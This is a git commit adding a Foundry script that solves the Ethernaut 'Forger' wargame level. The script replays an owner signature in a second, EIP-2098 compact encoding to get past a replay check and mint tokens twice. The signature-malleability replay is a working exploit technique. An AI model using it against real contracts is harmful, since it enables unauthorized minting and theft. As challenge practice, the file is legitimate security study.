64a6e92fea9f9c58d481b7e1ccbc2afc67793313
tienshaoku <tienshaoku@gmail.com>
2026-01-18 18:13:29 +0000

    feat: Forger

---
+++ script/openzeppelin-ethernaut/Forger.s.sol
@@ -0,0 +1,47 @@
+pragma solidity ^0.8.0;
+
+import "forge-std/Script.sol";
+import "test/openzeppelin-ethernaut/Forger.t.sol";
+
+contract ForgerScript is Script {
+    function run() external {
+        vm.startBroadcast();
+
+        Forger instance = Forger(vm.envAddress("FORGER"));
+        bytes32 r = 0xf73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809;
+        bytes32 s = 0x402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb;
+        uint8 v = 28;
+
+        address receiver = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e;
+        uint256 amount = 100 ether;
+        bytes32 salt = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d;
+        uint256 deadline = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
+        instance.createNewTokensFromOwnerSignature(
+            hex"f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb1c",
+            receiver,
+            amount,
+            salt,
+            deadline
+        );
+
+        uint256 n = uint256(
+            0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
+        );
+        uint256 s_uint = uint256(s);
+        uint256 canonical_s = n - s_uint > s_uint ? s_uint : n - s_uint;
+        bytes32 vs = bytes32(((uint256(v) - 27) << 255) | canonical_s);
+        bytes memory signature2098 = abi.encodePacked(r, vs);
+
+        instance.createNewTokensFromOwnerSignature(
+            signature2098,
+            receiver,
+            amount,
+            salt,
+            deadline
+        );
+
+        require(instance.totalSupply() == amount * 2, "failed");
+
+        vm.stopBroadcast();
+    }
+}
